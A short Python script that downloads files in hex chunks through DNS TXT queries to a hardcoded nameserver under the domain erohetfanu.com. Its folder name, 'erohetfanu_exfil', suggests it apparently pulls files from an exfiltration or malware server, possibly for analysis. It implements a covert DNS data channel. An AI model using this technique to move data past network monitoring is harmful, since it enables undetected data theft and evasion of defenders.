#!/usr/bin/env python

import binascii
import sys

import dns.name
import dns.resolver

if len(sys.argv) < 2:
    print "Usage: filename"
    sys.exit(1)

PATH = "erohetfanu_exfil"

erohet = dns.resolver.Resolver()
erohet.nameservers = ['104.196.126.19']

def query(name):
    print "Querying", name
    result = erohet.query("%s.erohetfanu.com" % name, "TXT").response.answer[0][-1].strings[0]
    return result
    
filename = sys.argv[1]
hex_file = binascii.hexlify(filename)

result = query(hex_file)
if result == "404NOTFOUND":
    print "File does not exist"
    sys.exit(1)
try:
    chunks = int(result)
except ValueError:
    print "Suspicious value", result
    with open(PATH + "/suspicious", 'a') as f:
        f.write(filename + ": " + result + "\n")
    sys.exit(1)

filename = filename.replace("..", "<DOTDOT>")
filename = filename.replace("/", "<SLASH>")
    
with open(PATH + "/%s" % filename, 'wb') as f:
    for chunk in range(chunks):
        if chunks > 1000 and chunk % 100 == 0 and chunk != 0:
            print "On chunk", chunk
        f.write(binascii.unhexlify(query("%s.%s" % (chunk, hex_file))))

print "Written to", PATH + "/%s" % filename
